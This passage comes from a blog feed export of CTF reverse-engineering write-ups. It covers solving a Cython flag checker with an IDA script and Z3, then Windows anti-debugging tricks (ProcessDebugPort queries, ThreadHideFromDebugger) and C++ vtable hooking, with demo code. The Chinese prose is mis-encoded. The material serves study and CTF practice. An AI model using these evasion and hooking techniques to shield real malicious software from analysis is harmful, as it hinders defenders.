&gt;&gt;= 0xb</span></span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(v27-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = v27-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      Py_Dealloc(v27);</span><br><span class="line">  &#125;</span><br><span class="line">  pw = PyNumber_Power(_xnum, table[<span class="number">38</span>], Py_NoneStruct);<span class="comment">// (pw = xnum ** 0x10001)</span></span><br><span class="line">  v_tuple = pw;</span><br><span class="line">  <span class="keyword">if</span> ( !pw )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2681</span>;</span><br><span class="line">    v7 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">  &#125;</span><br><span class="line">  p3 = PyNumber_Remainder(pw, table[<span class="number">49</span>]);       <span class="comment">// p3 = pw % 0x33FFFFFFD</span></span><br><span class="line">  <span class="keyword">if</span> ( !p3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2683</span>;</span><br><span class="line">    v7 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_66;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(v_tuple-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = v_tuple-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      Py_Dealloc(v_tuple);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = p3;</span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(p2-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = p2-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      Py_Dealloc(p2);</span><br><span class="line">  &#125;</span><br><span class="line">  nv_tuple = PyTuple_New(<span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !nv_tuple )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2697</span>;</span><br><span class="line">    v7 = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(p3-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(p3-&gt;refcnt);</span><br><span class="line">  nv_tuple-&gt;item = p3;</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(p1-&gt;refcnt) != <span class="number">-1</span> )</span><br><span class="line">    ++LODWORD(p1-&gt;refcnt);</span><br><span class="line">  nv_tuple[<span class="number">1</span>].refcnt = p1;</span><br><span class="line">  v2 = nv_tuple;</span><br><span class="line">LABEL_84:</span><br><span class="line">  <span class="keyword">if</span> ( SLODWORD(v5-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = v5-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">      Py_Dealloc(v5);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_87:</span><br><span class="line">  <span class="keyword">if</span> ( xnum )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(xnum-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = xnum-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">        Py_Dealloc(xnum);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( p1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( SLODWORD(p1-&gt;refcnt) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = p1-&gt;refcnt-- == <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v13 )</span><br><span class="line">        Py_Dealloc(p1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;                                    <span class="comment">// return (p3, p1)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>checkå‡½æ•°å¼€å¤´åˆå§‹åŒ–çš„keyè¡¨æ˜¯ä¹±çš„ è¿™é‡Œç”¨è„šæœ¬æ¥è·å–å…¶ä¸­çš„æ•°æ®:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> get_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fromPyLong</span>(<span class="params">PyobjAddr</span>):</span><br><span class="line">    size = get_bytes(PyobjAddr + <span class="number">8</span> * <span class="number">2</span>, <span class="number">8</span>)</span><br><span class="line">    size = <span class="built_in">int</span>.from_bytes(size, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    digtsLen = (size // <span class="number">8</span>)</span><br><span class="line">    digtsAddr = PyobjAddr + <span class="number">8</span> * <span class="number">3</span></span><br><span class="line">    pynum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(digtsLen):</span><br><span class="line">        t = <span class="built_in">int</span>.from_bytes(get_bytes(digtsAddr + i * <span class="number">4</span>, <span class="number">4</span>), <span class="string">&#x27;little&#x27;</span>) &amp; <span class="number">0x3FFFFFFF</span></span><br><span class="line">        pynum |= t &lt;&lt; (<span class="number">30</span> * i)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> pynum</span><br><span class="line"></span><br><span class="line">table = <span class="number">0x212827009B0</span></span><br><span class="line">datas = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    solved_addr = <span class="built_in">int</span>.from_bytes(get_bytes(table + i * <span class="number">8</span>, <span class="number">8</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    data = fromPyLong(solved_addr)</span><br><span class="line">    datas.append(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, datas)))</span><br></pre></td></tr></table></figure>

<p>è¿˜åŸè¿‡åå°±èƒ½ç›´æ¥ç”¨Z3è§£å‡ºç¬¦åˆæ¡ä»¶çš„è¾“å…¥äº†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> rand0m</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x12287f38</span>, <span class="number">0x98d24b3a</span>, <span class="number">0x4a30f74d</span>, <span class="number">0xe0f1db77</span>, <span class="number">0x23a1268</span>, <span class="number">0xadf38403</span>, <span class="number">0x88108807</span>, <span class="number">0xd8499bb6</span>]</span><br><span class="line">usr_input = <span class="string">&quot;&quot;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def rand0m(slc):</span></span><br><span class="line"><span class="comment">#     num = int(slc, 16)</span></span><br><span class="line"><span class="comment">#     xnum = num ^ 0x9e3779b9</span></span><br><span class="line"><span class="comment">#     p2 = (num &lt;&lt; 4) &amp; 0xfa3affff</span></span><br><span class="line"><span class="comment">#     p1 = ((num &gt;&gt; 5) &gt;&gt; 0x17) + p2</span></span><br><span class="line"><span class="comment">#     xnum &gt;&gt;= 0xB</span></span><br><span class="line"><span class="comment">#     p3 = (xnum ** 0x10001) % 0xFFFFFFFD</span></span><br><span class="line"><span class="comment">#     return (p3, p1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(4):</span></span><br><span class="line"><span class="comment">#     _slice = usr_input[i * 8: (i + 1) * 8]</span></span><br><span class="line"><span class="comment">#     res = rand0m(_slice)</span></span><br><span class="line"><span class="comment">#     k = key[i * 2]</span></span><br><span class="line"><span class="comment">#     if res[1] == k:</span></span><br><span class="line"><span class="comment">#         k = key[i * 2 + 1]</span></span><br><span class="line"><span class="comment">#         if res[0] == k:</span></span><br><span class="line"><span class="comment">#             count += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if count == 4:</span></span><br><span class="line"><span class="comment">#     print(&quot;Correct!&quot;)</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    s = Solver()</span><br><span class="line">    num = BitVec(<span class="string">f&#x27;num_<span class="subst">&#123;p&#125;</span>&#x27;</span>, <span class="number">33</span>)</span><br><span class="line">    xnum = num ^ <span class="number">0x9e3779b9</span></span><br><span class="line">    p2 = (num &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xfa3affff</span></span><br><span class="line">    p1 = ((num &gt;&gt; <span class="number">5</span>) &gt;&gt; <span class="number">23</span>) + p2</span><br><span class="line">    s.add(p1 == key[p * <span class="number">2</span>])</span><br><span class="line">    <span class="keyword">while</span> s.check() == sat:</span><br><span class="line">        m = s.model()</span><br><span class="line">        pw = rand0m.rand0m(<span class="built_in">hex</span>(m[num].as_long())[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">if</span> pw[<span class="number">0</span>] == key[p * <span class="number">2</span> + <span class="number">1</span>]:</span><br><span class="line">            flag += <span class="built_in">hex</span>(m[num].as_long())[<span class="number">2</span>:]</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s.add(num != m[num])</span><br></pre></td></tr></table></figure>

<h2 id="PyArmor"><a href="#PyArmor" class="headerlink" title="PyArmor"></a>PyArmor</h2><p>æ²¡å­¦åˆ°</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F12%2F23%2F20241223-183801.jpg" alt="2d02c83d1e65f2f5d83a2289822185cd"></p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>C/C++åé€†å‘æŠ€å·§é‰´èµ</title>
    <url>/2024/09/15/C-%E5%8F%8D%E9%80%86%E5%90%91%E6%8A%80%E5%B7%A7%E9%89%B4%E8%B5%8F/</url>
    <content><![CDATA[<p>è®°å½•ä¸€ä¸‹æ¯”èµ›ä¸­é‡åˆ°çš„å„ç§C&#x2F;C++çš„åé€†å‘æŠ€å·§(ä¸»è¦æ˜¯Windows API)</p>
<span id="more"></span>

<h1 id="åè°ƒè¯•æŠ€å·§"><a href="#åè°ƒè¯•æŠ€å·§" class="headerlink" title="åè°ƒè¯•æŠ€å·§"></a>åè°ƒè¯•æŠ€å·§</h1><h2 id="NtQueryInformationProcess-ZwQueryInformationProcess"><a href="#NtQueryInformationProcess-ZwQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess() &#x2F; ZwQueryInformationProcess()"></a>NtQueryInformationProcess() &#x2F; ZwQueryInformationProcess()</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>ä¸¤ä¸ªéƒ½æ˜¯Windowsä¸­æ£€æŸ¥å¹¶è·å–è¿›ç¨‹ä¿¡æ¯çš„å‡½æ•° åŒºåˆ«åœ¨äºè°ƒç”¨æ–¹å¼å’Œè°ƒç”¨æƒé™ Zwéœ€è¦åœ¨å†…æ ¸æ€è°ƒç”¨ Ntåœ¨ç”¨æˆ·æ€è°ƒç”¨ ä¸»è¦èµ·åˆ°åè°ƒè¯•ä½œç”¨çš„æ˜¯ç¬¬äºŒä¸ªå‚æ•°<code>ProcessInformationClass</code></p>
<p>å½“è¯¥å€¼ä¸º<code>ProcessDebugPort(0x07)</code>æ—¶è¿”å›ç¼“å†²åŒºä¸º<code>-1(è°ƒè¯•çŠ¶æ€), 0(éè°ƒè¯•çŠ¶æ€)</code></p>
<p>å½“è¯¥å€¼ä¸º<code>ProcessDebugObjectHandle(0x1E)</code>æ—¶è¿”å›ç¼“å†²åŒºä¸ºä¸€ä¸ªè°ƒè¯•å¯¹è±¡å¥æŸ„<code>!=NULL(è°ƒè¯•çŠ¶æ€), NULL(éè°ƒè¯•çŠ¶æ€)</code></p>
<p>å½“è¯¥å€¼ä¸º<code>ProcessDebugFlags(0x1F)</code>æ—¶è¿”å›ç¼“å†²åŒºä¸º<code>0(è°ƒè¯•çŠ¶æ€), 1(éè°ƒè¯•çŠ¶æ€)</code></p>
<h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><h4 id="LineCTF-BrownFlagChecker"><a href="#LineCTF-BrownFlagChecker" class="headerlink" title="[LineCTF BrownFlagChecker]"></a>[LineCTF BrownFlagChecker]</h4><p>å…¶ä¸­æœ‰ä¸€ä¸ªå‡½æ•°å¦‚ä¸‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">anti_debug</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (__fastcall *SystemRoutineAddress)(__int64, __int64, __int64 *); <span class="comment">// rax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">SystemRoutineName</span>;</span> <span class="comment">// [rsp+30h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+50h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *&amp;SystemRoutineName.Length = <span class="number">0x340032</span>;</span><br><span class="line">  SystemRoutineName.Buffer = <span class="string">L&quot;ZwQueryInformationProcess&quot;</span>;</span><br><span class="line">  SystemRoutineAddress = MmGetSystemRoutineAddress(&amp;SystemRoutineName);</span><br><span class="line">  <span class="keyword">if</span> ( !SystemRoutineAddress )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  SystemRoutineAddress(<span class="number">-1</span>i64, <span class="number">7</span>i64, &amp;v3);</span><br><span class="line">  <span class="keyword">return</span> v3 != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ååˆ¶æªæ–½"><a href="#ååˆ¶æªæ–½" class="headerlink" title="ååˆ¶æªæ–½"></a>ååˆ¶æªæ–½</h3><p>ç›´æ¥patchæ‰æ•´ä¸ªå‡½æ•°çš„è°ƒç”¨æˆ–è€…ä¿®æ”¹æ§åˆ¶æµä½¿å¾—ç”¨äºæ£€æµ‹è°ƒè¯•çš„ä¿¡æ¯å¤±æ•ˆ</p>
<h2 id="NtSetInformationThread-ZwSetInformationThread"><a href="#NtSetInformationThread-ZwSetInformationThread" class="headerlink" title="NtSetInformationThread() &#x2F; ZwSetInformationThread()"></a>NtSetInformationThread() &#x2F; ZwSetInformationThread()</h2><p>ä¸¤è€…çš„åˆ†åˆ«ä¸ä¸Šè¿°å·®ä¸å¤š åŠŸèƒ½æ˜¯è®¾ç½®ä¿¡æ¯è€Œä¸æ˜¯æ£€æŸ¥ä¿¡æ¯ å½“ç¬¬äºŒä¸ªå‚æ•°ä¸º<code>ThreadHideFromDebugger(0x11)</code>æ—¶å°†é™„åŠ çš„è°ƒè¯•å™¨å–æ¶ˆ</p>
<h3 id="ä¾‹å­-1"><a href="#ä¾‹å­-1" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><h4 id="XCTF-Destination"><a href="#XCTF-Destination" class="headerlink" title="[XCTF Destination]"></a>[XCTF Destination]</h4><p>å…¶ä¸­ä¸€ä¸ªé¢„å¤„ç†å‡½æ•°å¦‚ä¸‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__thiscall <span class="title function_">sub_413750</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentThread; <span class="comment">// eax</span></span><br><span class="line">  FARPROC ProcAddress; <span class="comment">// [esp+D0h] [ebp-2Ch]</span></span><br><span class="line">  HMODULE hModule; <span class="comment">// [esp+DCh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_4250E0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i )</span><br><span class="line">    ModuleName[i] = (ModuleName[i] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">22</span>; ++j )</span><br><span class="line">    aS[j] = (aS[j] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">18</span>; ++k )</span><br><span class="line">    byte_423020[k] = (byte_423020[k] - <span class="number">100</span>) ^ <span class="number">0x55</span>;</span><br><span class="line">  hModule = GetModuleHandleA(ModuleName);</span><br><span class="line">  ProcAddress = GetProcAddress(hModule, aS);</span><br><span class="line">  CurrentThread = GetCurrentThread();</span><br><span class="line">  (ProcAddress)(CurrentThread, <span class="number">0x11</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨åˆ›å»ºçº¿ç¨‹å¤„ä¸‹æ–­ç‚¹è°ƒè¯•åˆ°æ­¤å¤„ å¯ä»¥çœ‹åˆ°<code>aS</code>æ•°ç»„å‚¨å­˜çš„å®é™…ä¸Šæ˜¯<code>ZwSetInformationThread</code> è€Œä¸”ç¬¬äºŒä¸ªå‚æ•°æ˜¯0x11 è¿™æ—¶åœ¨çº¿ç¨‹å¯åŠ¨æ—¶è°ƒè¯•å™¨ä¼šè¢«ç«‹åˆ»å–æ¶ˆ</p>
<h3 id="ååˆ¶æªæ–½-1"><a href="#ååˆ¶æªæ–½-1" class="headerlink" title="ååˆ¶æªæ–½"></a>ååˆ¶æªæ–½</h3><p>å°†ç¬¬äºŒä¸ªå‚æ•°patchä¸º0</p>
<h1 id="è™šè¡¨-hook"><a href="#è™šè¡¨-hook" class="headerlink" title="è™šè¡¨ hook"></a>è™šè¡¨ hook</h1><h2 id="C-ç±»ä¸­å„ç§æˆå‘˜åœ¨å†…å­˜ä¸­çš„åˆ†å¸ƒ"><a href="#C-ç±»ä¸­å„ç§æˆå‘˜åœ¨å†…å­˜ä¸­çš„åˆ†å¸ƒ" class="headerlink" title="C++ç±»ä¸­å„ç§æˆå‘˜åœ¨å†…å­˜ä¸­çš„åˆ†å¸ƒ"></a>C++ç±»ä¸­å„ç§æˆå‘˜åœ¨å†…å­˜ä¸­çš„åˆ†å¸ƒ</h2><p>ä»¥ä»¥ä¸‹ä»£ç ç¼–è¯‘å‡ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸ºä¾‹:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vmt_test</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> var;</span><br><span class="line">    <span class="built_in">vmt_test</span>()&#123;</span><br><span class="line">        var = <span class="number">10</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Test constructor&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">function1_To_hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function1 in VMT, Havnt been hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">function2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function2 in VMT&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">function3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function3 not in VMT&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vmt_drivation</span> : <span class="keyword">public</span> vmt_test&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">function1_To_hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function1 in Drivation, Havnt been hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vmt_test* test = <span class="keyword">new</span> <span class="built_in">vmt_test</span>();</span><br><span class="line">    test-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    test-&gt;<span class="built_in">function2</span>();</span><br><span class="line">    vmt_test* test2 = <span class="keyword">new</span> <span class="built_in">vmt_test</span>();</span><br><span class="line">    test2-&gt;<span class="built_in">function3</span>();</span><br><span class="line">    vmt_drivation* drv = <span class="keyword">new</span> <span class="built_in">vmt_drivation</span>();</span><br><span class="line">    drv-&gt;<span class="built_in">function1_To_hook</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="éè™šæˆå‘˜å‡½æ•°"><a href="#éè™šæˆå‘˜å‡½æ•°" class="headerlink" title="éè™šæˆå‘˜å‡½æ•°"></a>éè™šæˆå‘˜å‡½æ•°</h3><p>å’Œæ™®é€šå‡½æ•°ä¸€æ ·æ²¡æœ‰åŒºåˆ« åœ¨<code>.text</code>æ®µå®ç° ä¸è¢«é™¤äº†è°ƒç”¨å¤„ä»¥å¤–çš„åœ°æ–¹å¼•ç”¨:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-093329.png" alt="image-20240915093322380"></p>
<h3 id="è™šæˆå‘˜å‡½æ•°"><a href="#è™šæˆå‘˜å‡½æ•°" class="headerlink" title="è™šæˆå‘˜å‡½æ•°"></a>è™šæˆå‘˜å‡½æ•°</h3><p>åœ¨<code>.text</code>æ®µå®ç° ä¸ä¼šè¢«è°ƒç”¨å¤„å¼•ç”¨å¤–ä¸”æ’åˆ—åœ¨<code>VMT</code> å³è™šå‡½æ•°è¡¨ä¸­ åœ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶é€šè¿‡æŸ¥è¡¨è°ƒç”¨:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-094620.png" alt="image-20240915094620479"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-094223.png" alt="image-20240915094223312"></p>
<p>è™šå‡½æ•°è¡¨ç›¸å½“äºä¸€ä¸ªç‰¹æ®Šçš„ç±»æˆå‘˜å˜é‡ åˆå§‹åŒ–æ—¶è¢«èµ‹å€¼ç»™å®ä¾‹çš„ç±»å¯¹è±¡åç§»ä¸º0çš„ä½ç½®:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-094410.png" alt="image-20240915094410949"></p>
<h3 id="ç»§æ‰¿ç±»çš„è™šå‡½æ•°"><a href="#ç»§æ‰¿ç±»çš„è™šå‡½æ•°" class="headerlink" title="ç»§æ‰¿ç±»çš„è™šå‡½æ•°"></a>ç»§æ‰¿ç±»çš„è™šå‡½æ•°</h3><p>æ–°å»ºä¸€å¼ è™šå‡½æ•°è¡¨ å¯¹å·²ç»å®ç°çš„è™šå‡½æ•°è¿›è¡Œæ›¿æ¢ æ²¡æœ‰å®ç°çš„è™šå‡½æ•°åˆ™å¼•ç”¨åŸè™šå‡½æ•°è¡¨ä¸­çš„å¯¹åº”å‡½æ•° å¦‚æœç»§æ‰¿ç±»æ²¡æœ‰è‡ªå·±çš„æ„é€ å‡½æ•°åˆ™è°ƒç”¨åŸºç±»çš„æ„é€ å‡½æ•°ä¸­å°†åŸºç±»çš„VMTèµ‹ç»™åç§»ä¸º0çš„å†…å­˜ å†åœ¨æ„é€ å‡½æ•°åç”¨æ–°çš„VMTè¦†ç›–:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-095120.png" alt="image-20240915095120334"></p>
<h3 id="æˆå‘˜å˜é‡"><a href="#æˆå‘˜å˜é‡" class="headerlink" title="æˆå‘˜å˜é‡"></a>æˆå‘˜å˜é‡</h3><p>å°±åƒä½œä¸ºæˆå‘˜å˜é‡çš„VMTä¸€æ ·åœ¨æ„é€ å‡½æ•°ä¸­è¢«ä¾æ¬¡èµ‹å€¼ç»™åç§»ä¸º<code>n * sizeof(void *)</code>çš„å†…å­˜:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F15%2F20240915-095435.png" alt="image-20240915095435528"></p>
<h2 id="Hookè™šå‡½æ•°"><a href="#Hookè™šå‡½æ•°" class="headerlink" title="Hookè™šå‡½æ•°"></a>Hookè™šå‡½æ•°</h2><p>ç”±äºè™šå‡½æ•°çš„è°ƒç”¨éƒ½æ˜¯é—´æ¥çš„ è€Œä¸”VMTçš„åœ°å€å’Œç±»çš„åœ°å€æ˜¯ç»‘å®šçš„ åªéœ€è¦å°†VMTä¸­è¦hookçš„è™šå‡½æ•°çš„åœ°å€æ›¿æ¢ä¸ºç”¨æˆ·å‡½æ•°å°±èƒ½è½»æ¾å®ç°hook ç”¨ä»¥ä¸‹ä»£ç ç¼–è¯‘å‡ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸ºä¾‹(ç¼–è¯‘æ—¶å¯ç”¨<code>-fpermissive</code>é€‰é¡¹):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vmt_test</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> var;</span><br><span class="line">    <span class="built_in">vmt_test</span>()&#123;</span><br><span class="line">        var = <span class="number">10</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Test constructor&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">function1_To_hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function1 in VMT, Havnt been hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">function2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function2 in VMT&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">function3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function3 not in VMT&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vmt_drivation</span> : <span class="keyword">public</span> vmt_test&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">function1_To_hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Function1 in Drivation, Havnt been hooked&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hook</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Hooked&quot;</span> &lt;&lt; endl;</span><br><span 